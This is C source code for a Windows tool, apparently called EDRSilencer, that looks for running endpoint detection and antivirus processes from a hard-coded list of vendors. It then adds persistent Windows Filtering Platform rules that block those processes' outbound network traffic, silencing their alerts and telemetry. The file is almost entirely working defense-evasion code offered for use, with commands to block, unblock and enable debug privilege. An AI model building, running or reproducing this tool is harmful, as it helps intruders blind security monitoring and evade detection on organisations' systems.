#include "utils.h"

char* edrProcess[] = {
// Microsoft Defender for Endpoint and Microsoft Defender Antivirus
    "MsMpEng.exe",
    "MsSense.exe",
    "SenseIR.exe",
    "SenseNdr.exe",
    "SenseCncProxy.exe",
    "SenseSampleUploader.exe",
// Elastic EDR
    "winlogbeat.exe"
    "elastic-agent.exe",
    "elastic-endpoint.exe",
    "filebeat.exe",
// Trellix EDR
    "xagt.exe",
// Qualys EDR
    "QualysAgent.exe",
// SentinelOne
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",  
    "LogProcessorService.exe",
    "SentinelStaticEngineScanner.exe",
    "SentinelHelperService.exe",
    "SentinelBrowserNativeHost.exe",
// Cylance
    "CylanceSvc.exe",
// Cybereason
    "AmSvc.exe",
    "CrAmTray.exe",
    "CrsSvc.exe",
    "ExecutionPreventionSvc.exe",
    "CybereasonAV.exe",
// Carbon Black EDR
    "cb.exe",
// Carbon Black Cloud
    "RepMgr.exe",
    "RepUtils.exe",
    "RepUx.exe",
    "RepWAV.exe",
    "RepWSC.exe",
// Tanium
    "TaniumClient.exe",
    "TaniumCX.exe",
    "TaniumDetectEngine.exe",
// Palo Alto Networks Traps/Cortex XDR
    "Traps.exe",
    "cyserver.exe",
    "CyveraService.exe",
    "CyvrFsFlt.exe",
// FortiEDR
    "fortiedr.exe",
// Cisco Secure Endpoint (Formerly Cisco AMP)
    "sfc.exe"
};

BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };

// The "unblockall" feature will delete all filters that are based on the custom filter name
WCHAR* filterName = L"Custom Outbound Filter";

// d78e1e87-8644-4ea5-9437-d809ecefc971
DEFINE_GUID(
   FWPM_CONDITION_ALE_APP_ID,
   0xd78e1e87,
   0x8644,
   0x4ea5,
   0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71
);

// c38d57d1-05a7-4c33-904f-7fbceee60e82
DEFINE_GUID(
   FWPM_LAYER_ALE_AUTH_CONNECT_V4,
   0xc38d57d1,
   0x05a7,
   0x4c33,
   0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82
);

// 4a72393b-319f-44bc-84c3-ba54dcb3b6b4
DEFINE_GUID(
   FWPM_LAYER_ALE_AUTH_CONNECT_V6,
   0x4a72393b,
   0x319f,
   0x44bc,
   0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4
);

// Check if the running process is our list
BOOL isInEdrProcessList(const char* procName) {
    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {
        if (strstr(procName, edrProcess[i]) != NULL && !inWfpFlag[i]) {
            inWfpFlag[i] = TRUE;
            return TRUE;
        }
    }
    return FALSE;
}

// Add WFP filters for all known EDR process(s)
void BlockEdrProcessTraffic() {
    HANDLE hEngine;
    FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    HANDLE hProcessSnap;
    HANDLE hModuleSnap;
    PROCESSENTRY32 pe32;
    MODULEENTRY32 me32;
    BOOL isEdrDetected = FALSE;
   
    EnableSeDebugPrivilege();

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x\n", GetLastError());
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        printf("[-] Process32First failed with error code: 0x%x\n", GetLastError());
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        if (isInEdrProcessList(pe32.szExeFile)) {
            isEdrDetected = TRUE;
            printf("Detected running EDR process: %s (%d):\n", pe32.szExeFile, pe32.th32ProcessID);
            // Get full path of the running process
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                WCHAR fullPath[MAX_PATH];
                DWORD size = MAX_PATH;
                QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                FWPM_FILTER_CONDITION0 cond;
                FWPM_FILTER0 filter = {0};
                FWP_BYTE_BLOB* appId;

                if (FwpmGetAppIdFromFileName0(fullPath, &appId) != ERROR_SUCCESS) {
                    printf("    [-] FwpmGetAppIdFromFileName0 failed to get app ID.\n");
                    CloseHandle(hProcess);
                    continue;
                }

                // Setting up WFP filter and condition
                filter.displayData.name = filterName;
                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
                filter.action.type = FWP_ACTION_BLOCK;
                cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
                cond.matchType = FWP_MATCH_EQUAL;
                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
                cond.conditionValue.byteBlob = appId;
                filter.filterCondition = &cond;
                filter.numFilterConditions = 1;

                UINT64 filterId;
                DWORD result;

                // Add filter to both IPv4 and IPv6 layers
                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
                } else {
                    printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x\n", result);
                }
                
                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                if (result == ERROR_SUCCESS) {
                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
                } else {
                    printf("    [-] Failed to add filter in IPv6 layer with error code: 0x%x\n", result);
                }

                FwpmFreeMemory0((void**)&appId);
                CloseHandle(hProcess);
            } else {
                printf("    [-] Could not open process \"%s\" with error code: 0x%x\n", pe32.szExeFile, GetLastError());
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    if (!isEdrDetected) {
        printf("[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
    }
    CloseHandle(hProcessSnap);
    FwpmEngineClose0(hEngine);
    return;
}

// Add block WFP filter to user-defined process
void BlockProcessTraffic(char* fullPath) {
    HANDLE hEngine;
    FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);

    WCHAR wFullPath[MAX_PATH];
    DWORD size = MAX_PATH;
    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
    FWPM_FILTER_CONDITION0 cond;
    FWPM_FILTER0 filter = {0};
    
    FWP_BYTE_BLOB* appId;

    if (FwpmGetAppIdFromFileName0(wFullPath, &appId) != ERROR_SUCCESS) {
        printf("[-] FwpmGetAppIdFromFileName0 failed to get app ID. Please check if the process path is valid.\n");
        return;
    }

    // Setting up WFP filter and condition
    filter.displayData.name = filterName;
    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_BLOCK;
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;
    filter.filterCondition = &cond;
    filter.numFilterConditions = 1;

    UINT64 filterId;
    DWORD result;

    // Add filter to both IPv4 and IPv6 layers
    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
    } else {
        printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x\n", result);
    }

    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
    } else {
        printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x\n", result);
    }

    FwpmFreeMemory0((void**)&appId);
    FwpmEngineClose0(hEngine);
    return;
}

// Remove all WFP filters previously created
void UnblockAllWfpFilters() {
    HANDLE hEngine;
    DWORD result;
    HANDLE enumHandle;
    FWPM_FILTER0** filters;
    UINT32 numFilters = 0;
    BOOL foundFilter = FALSE;
    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x\n", result);
        return;
    }

    result = FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x\n", result);
        return;
    }

    while(TRUE) {
        result = FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);

        if (result != ERROR_SUCCESS) {
            printf("[-] FwpmFilterEnum0 failed with error code: 0x%x\n", result);
            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            FwpmEngineClose0(hEngine);
            return;
        }

        if (numFilters == 0) {
			break;
        }
        
        FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
        WCHAR* currentFilterName = data->name;
        if (wcscmp(currentFilterName, filterName) == 0) {
            foundFilter = TRUE;
            UINT64 filterId = filters[0]->filterId;
            result = FwpmFilterDeleteById0(hEngine, filterId);
            if (result == ERROR_SUCCESS) {
                printf("Deleted filter id: %llu.\n", filterId);
            } else {
                printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
            }
        }
    }

    if (!foundFilter) {
        printf("[-] Unable to find any WFP filter created by this tool.\n");
    }
    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    FwpmEngineClose0(hEngine);
}

// Remove WFP filter based on filter id
void UnblockWfpFilter(UINT64 filterId) {
    HANDLE hEngine;
    DWORD result;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x\n", result);
        return;
    }
    
    result = FwpmFilterDeleteById0(hEngine, filterId);

    if (result == ERROR_SUCCESS) {
        printf("Deleted filter id: %llu.\n", filterId);
    }
    else if (result == FWP_E_FILTER_NOT_FOUND) {
        printf("[-] The filter does not exist.\n");
    } else {
        printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
    }

    FwpmEngineClose0(hEngine);
}

void PrintHelp() {
    printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
    printf("Version: 1.1\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
    printf("  EDRSilencer.exe blockedr\n\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
    printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
    printf("- Remove all WFP filters applied by this tool:\n");
    printf("  EDRSilencer.exe unblockall\n\n");
    printf("- Remove a specific WFP filter based on filter id:\n");
    printf("  EDRSilencer.exe unblock <filter id>");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        PrintHelp();
        return 1;
    }

    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0) {
        PrintHelp();
        return 1;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        BlockEdrProcessTraffic();
    } else if (strcmp(argv[1], "block") == 0) {
        if (argc < 3) {
            printf("[-] Missing second argument. Please provide the full path of the process to block.\n");
            return 1;
        }
        BlockProcessTraffic(argv[2]);
    } else if (strcmp(argv[1], "unblockall") == 0) {
        UnblockAllWfpFilters();
    } else if (strcmp(argv[1], "unblock") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument for 'unblock' command. Please provide the filter id.\n");
            return 1;
        }
        char *endptr;
        errno = 0;

        UINT64 filterId = strtoull(argv[2], &endptr, 10);

        if (errno != 0) {
            printf("[-] strtoull failed with error code: 0x%x\n", errno);
            return 1;
        }

        if (endptr == argv[2]) {
            printf("[-] Please provide filter id in digits.\n");
            return 1;
        }
        UnblockWfpFilter(filterId);
    } else {
        printf("[-] Invalid argument: \"%s\".\n", argv[1]);
        return 1;
    }
    return 0;
}
